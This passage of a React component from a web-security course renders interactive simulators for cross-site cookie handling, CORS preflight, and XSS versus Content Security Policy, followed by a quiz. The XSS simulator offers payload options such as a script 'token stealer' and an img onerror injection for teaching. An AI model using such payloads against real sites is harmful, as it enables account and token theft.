                      testContext === "top_level_cross_nav"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600 hover:bg-slate-850"
                    }`}
                  >
                    2. Cross-Site Top Link
                  </button>
                  <button
                    onClick={() => setTestContext("cross_site_post")}
                    className={`p-2.5 rounded-lg border text-left transition ${
                      testContext === "cross_site_post"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600 hover:bg-slate-850"
                    }`}
                  >
                    3. Cross-Site POST (CSRF)
                  </button>
                  <button
                    onClick={() => setTestContext("cross_site_img")}
                    className={`p-2.5 rounded-lg border text-left transition ${
                      testContext === "cross_site_img"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600 hover:bg-slate-850"
                    }`}
                  >
                    4. Cross-Site &lt;img&gt; Fetch
                  </button>
                  <button
                    onClick={() => setTestContext("js_document_cookie")}
                    className={`p-2.5 rounded-lg border text-left transition ${
                      testContext === "js_document_cookie"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600 hover:bg-slate-850"
                    }`}
                  >
                    5. document.cookie Access
                  </button>
                </div>
              </div>

              {/* Simulation Result */}
              <div
                className={`p-5 rounded-xl border text-xs space-y-3 ${
                  cookieSimulation.riskLevel === "CRITICAL_CSRF" ||
                  cookieSimulation.riskLevel === "CRITICAL_XSS"
                    ? "bg-rose-950/30 border-rose-800/80 text-rose-200"
                    : cookieSimulation.cookieSent
                    ? "bg-emerald-950/30 border-emerald-800/80 text-emerald-200"
                    : "bg-cyan-950/30 border-cyan-800/80 text-cyan-200"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm flex items-center space-x-2">
                    {cookieSimulation.cookieSent ? (
                      <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    ) : (
                      <Ban className="w-5 h-5 text-rose-400" />
                    )}
                    <span>
                      Outcome: Cookie {cookieSimulation.cookieSent ? "TRANSMITTED TO SERVER" : "BLOCKED BY BROWSER"}
                    </span>
                  </span>
                  <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-stone-50/80">
                    JS Readable: {cookieSimulation.jsReadable ? "YES (EXPOSED)" : "NO (PROTECTED)"}
                  </span>
                </div>
                <p className="leading-relaxed text-stone-800">{cookieSimulation.reason}</p>
              </div>
            </div>
          )}

          {/* TAB: SIMULATOR 3 - SOP & CORS PREFLIGHT */}
          {activeTab === "sop-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                    <Globe className="w-5 h-5 text-orange-600" />
                    <span>Simulator 3: Same-Origin Policy (SOP) & CORS Preflight Engine</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Compare origin tuples, trigger OPTIONS preflights, and evaluate cross-origin data access permissions.
                  </p>
                </div>
              </div>

              {/* Origin Configuration */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2">
                  <label className="text-orange-600 font-bold block">Caller Origin (Frontend Client)</label>
                  <input
                    type="text"
                    value={callerOrigin}
                    onChange={(e) => setCallerOrigin(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800 font-mono"
                  />
                  <div className="text-[11px] text-stone-600">
                    Scheme: <span className="text-stone-800">{corsAnalysis.cOrg.protocol}</span> | Host:{" "}
                    <span className="text-stone-800">{corsAnalysis.cOrg.host}</span> | Port:{" "}
                    <span className="text-stone-800">{corsAnalysis.cOrg.port}</span>
                  </div>
                </div>

                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-2">
                  <label className="text-amber-400 font-bold block">Target API Origin</label>
                  <input
                    type="text"
                    value={targetOrigin}
                    onChange={(e) => setTargetOrigin(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800 font-mono"
                  />
                  <div className="text-[11px] text-stone-600">
                    Scheme: <span className="text-stone-800">{corsAnalysis.tOrg.protocol}</span> | Host:{" "}
                    <span className="text-stone-800">{corsAnalysis.tOrg.host}</span> | Port:{" "}
                    <span className="text-stone-800">{corsAnalysis.tOrg.port}</span>
                  </div>
                </div>
              </div>

              {/* Request Parameters */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">HTTP Method</label>
                  <select
                    value={requestMethod}
                    onChange={(e) => setRequestMethod(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="GET">GET (Simple)</option>
                    <option value="POST">POST</option>
                    <option value="PUT">PUT (Triggers Preflight)</option>
                    <option value="DELETE">DELETE (Triggers Preflight)</option>
                    <option value="PATCH">PATCH (Triggers Preflight)</option>
                  </select>
                </div>
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Content-Type</label>
                  <select
                    value={requestContentType}
                    onChange={(e) => setRequestContentType(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="application/json">application/json (Preflight)</option>
                    <option value="text/plain">text/plain (Simple)</option>
                    <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded (Simple)</option>
                  </select>
                </div>
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Server Allow-Origin Header</label>
                  <input
                    type="text"
                    value={corsAllowOrigin}
                    onChange={(e) => setCorsAllowOrigin(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800 font-mono"
                    placeholder="https://app.prepspaces.com or *"
                  />
                </div>
              </div>

              {/* Resolution Verdict */}
              <div
                className={`p-5 rounded-xl border text-xs space-y-3 ${
                  corsAnalysis.browserAllowed
                    ? "bg-emerald-950/30 border-emerald-800/80 text-emerald-200"
                    : "bg-rose-950/30 border-rose-800/80 text-rose-200"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm flex items-center space-x-2">
                    {corsAnalysis.browserAllowed ? (
                      <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    ) : (
                      <ShieldX className="w-5 h-5 text-rose-400" />
                    )}
                    <span>
                      {corsAnalysis.isSameOrigin
                        ? "SAME-ORIGIN REQUEST: FULL ACCESS GRANTED"
                        : corsAnalysis.browserAllowed
                        ? "CORS SUCCESS: SCRIPT PERMITTED TO READ RESPONSE"
                        : "BROWSER SECURITY VIOLATION: RESPONSE BLOCKED"}
                    </span>
                  </span>
                  <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-stone-50/80">
                    Preflight Required: {corsAnalysis.preflightRequired ? "YES (OPTIONS)" : "NO"}
                  </span>
                </div>
                <p className="leading-relaxed text-stone-800">
                  {corsAnalysis.errorReason
                    ? corsAnalysis.errorReason
                    : corsAnalysis.isSameOrigin
                    ? "Both scheme, host, and port are identical. The browser enforces no cross-origin restrictions; scripts can read response payloads directly."
                    : "Cross-origin request satisfied all CORS checks. Preflight approved the method and headers, and credentials policy was obeyed."}
                </p>
              </div>
            </div>
          )}

          {/* TAB: SIMULATOR 4 - XSS VS CSP DEFENSE */}
          {activeTab === "xss-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                    <Bug className="w-5 h-5 text-orange-600" />
                    <span>Simulator 4: XSS Exploitation vs Content Security Policy (CSP)</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Inject payloads into DOM sinks and observe how strict CSP directives neutralize malicious execution.
                  </p>
                </div>
              </div>

              {/* Injection Controls */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Injected Payload</label>
                  <select
                    value={xssPayloadType}
                    onChange={(e) => setXssPayloadType(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="script_tag">&lt;script&gt; fetch token stealer</option>
                    <option value="img_onerror">&lt;img src=x onerror=alert()&gt;</option>
                    <option value="href_javascript">&lt;a href=&quot;javascript:...&quot;&gt;</option>
                    <option value="benign_text">Benign Student Profile Text</option>
                  </select>
                </div>
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">DOM Insertion Sink</label>
                  <select
                    value={domSinkMethod}
                    onChange={(e) => setDomSinkMethod(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="innerHTML">element.innerHTML (Dangerous Sink)</option>
                    <option value="textContent">element.textContent (Safe Text Sink)</option>
                  </select>
                </div>
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Content-Security-Policy</label>
                  <select
                    value={cspConfigMode}
                    onChange={(e) => setCspConfigMode(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="none">No CSP (Vulnerable)</option>
                    <option value="unsafe_inline">script-src &apos;unsafe-inline&apos; (Weak)</option>
                    <option value="strict_self">script-src &apos;self&apos; (Standard)</option>
                    <option value="nonce_strict">script-src &apos;nonce-xyz&apos; &apos;strict-dynamic&apos;</option>
                  </select>
                </div>
              </div>

              {/* Execution Visualizer */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 space-y-2">
                  <div className="text-orange-600 font-bold border-b border-stone-200 pb-1">Raw Untrusted Input</div>
                  <pre className="text-stone-700 text-[11px] whitespace-pre-wrap break-all">
                    {xssSimulation.rawPayload}
                  </pre>
                </div>
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 space-y-2">
                  <div className="text-amber-400 font-bold border-b border-stone-200 pb-1">Resulting Browser DOM</div>
                  <pre className="text-stone-700 text-[11px] whitespace-pre-wrap break-all">
                    {xssSimulation.renderedDom}
                  </pre>
                </div>
              </div>

              {/* Execution Outcome */}
              <div
                className={`p-5 rounded-xl border text-xs space-y-3 ${
                  xssSimulation.scriptExecuted
                    ? "bg-rose-950/30 border-rose-800/80 text-rose-200"
                    : "bg-emerald-950/30 border-emerald-800/80 text-emerald-200"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm flex items-center space-x-2">
                    {xssSimulation.scriptExecuted ? (
                      <Flame className="w-5 h-5 text-rose-400 animate-pulse" />
                    ) : (
                      <ShieldCheck className="w-5 h-5 text-emerald-400" />
                    )}
                    <span>
                      {xssSimulation.scriptExecuted
                        ? "CRITICAL XSS EXPLOITATION SUCCEEDED"
                        : "ATTACK DEFENDED & SCRIPT NEUTRALIZED"}
                    </span>
                  </span>
                </div>
                <p className="leading-relaxed text-stone-800">{xssSimulation.blockReason}</p>
              </div>
            </div>
          )}

          {/* TAB: KNOWLEDGE ASSESSMENT QUIZ (13.14) */}
          {activeTab === "quiz" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                    <Award className="w-5 h-5 text-orange-600" />
                    <span>13.14 Web Security Knowledge Assessment</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    10 scenario-based questions to validate your mastery of web architecture, sessions, and browser security.
                  </p>
                </div>
                {quizSubmitted && (
                  <div className="text-right">
                    <span className="text-xs text-stone-600">Final Score: </span>
                    <span
                      className={`text-base font-bold font-mono ${
                        quizScore >= 8 ? "text-emerald-400" : "text-amber-400"
                      }`}
                    >
                      {quizScore} / 10 ({quizScore * 10}%)
                    </span>
                  </div>
                )}
              </div>

              <div className="space-y-4">
                {quizQuestions.map((q, idx) => {
                  const isAnswered = quizAnswers[q.id] !== undefined;
                  const isCorrect = isAnswered && quizAnswers[q.id] === q.correct;
                  const isIncorrect = isAnswered && !isCorrect;

                  return (
                    <div
                      key={q.id}
                      className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-3 text-xs"
                    >
                      <div className="flex items-start justify-between">
                        <span className="font-bold text-white text-sm">
                          {idx + 1}. {q.question}
                        </span>
                        {quizSubmitted && (
                          <span
                            className={`px-2 py-0.5 rounded text-[11px] font-bold ${
                              isCorrect
                                ? "bg-emerald-950 text-emerald-400 border border-emerald-800"
                                : "bg-rose-950 text-rose-400 border border-rose-800"
                            }`}
                          >
                            {isCorrect ? "Correct" : "Incorrect"}
                          </span>
                        )}
                      </div>

                      <div className="space-y-2">
                        {q.options.map((opt, optIdx) => {
                          const isSelected = quizAnswers[q.id] === optIdx;
                          let btnStyle = "bg-slate-950 border-stone-200 text-stone-700 hover:bg-slate-850";

                          if (quizSubmitted) {
                            if (optIdx === q.correct) {
                              btnStyle = "bg-emerald-950/60 border-emerald-500 text-emerald-200 font-bold";
                            } else if (isSelected) {
                              btnStyle = "bg-rose-950/60 border-rose-500 text-rose-200";
                            } else {
                              btnStyle = "bg-stone-50 border-slate-900 text-stone-500";
                            }
                          } else if (isSelected) {
                            btnStyle = "bg-cyan-950/60 border-cyan-400 text-cyan-200 font-semibold";
                          }

                          return (
                            <button
                              key={optIdx}
                              disabled={quizSubmitted}
                              onClick={() => handleSelectAnswer(q.id, optIdx)}
                              className={`w-full text-left p-3 rounded-lg border transition flex items-center justify-between ${btnStyle}`}
                            >
                              <span>{opt}</span>
                              {isSelected && <Check className="w-3.5 h-3.5 text-orange-600" />}
                            </button>
                          );
                        })}
                      </div>

                      {quizSubmitted && (
                        <div className="mt-3 p-3 bg-slate-950 rounded-lg border border-stone-200 text-stone-700 text-[11px] leading-relaxed">
                          <strong className="text-orange-600">Architectural Rationale: </strong>
                          {q.explanation}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>

              {!quizSubmitted ? (
                <button
                  onClick={() => setQuizSubmitted(true)}
                  disabled={Object.keys(quizAnswers).length < quizQuestions.length}
                  className={`w-full py-3 rounded-xl font-bold text-xs uppercase tracking-wider transition ${
                    Object.keys(quizAnswers).length === quizQuestions.length
                      ? "bg-cyan-500 hover:bg-cyan-400 text-slate-950 shadow-lg shadow-cyan-500/20"
                      : "bg-slate-800 text-stone-500 cursor-not-allowed"
                  }`}
                >
                  Submit Assessment ({Object.keys(quizAnswers).length}/10 Answered)
                </button>
              ) : (
                <button
                  onClick={() => {
                    setQuizSubmitted(false);
                    setQuizAnswers({});
                  }}
                  className="w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-stone-800 font-bold text-xs uppercase tracking-wider transition"
                >
                  Retake Assessment
                </button>
              )}
            </div>
          )}
        </div>
      </main>

      {/* Embedded Nova AI Tutor Drawer */}
      <LearningRo
        isOpen={showAiTutor}
        onClose={() => setShowAiTutor(false)}
        topic="Web Application Architecture, HTTP Sessions, Cookies, and Browser Security"
        courseContext="Prepspaces Cybersecurity Master Course - Module 13"
      />
    </div>
  );
}
